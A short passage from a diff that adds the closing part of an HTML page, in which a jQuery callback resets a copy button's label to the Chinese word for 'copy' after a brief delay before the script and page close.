+        setTimeout(function () {
+          $b.text('复制')
+        }, 300)
+      }).append(e)
+    })
+  </script>
+
+
+</body>
+</html>
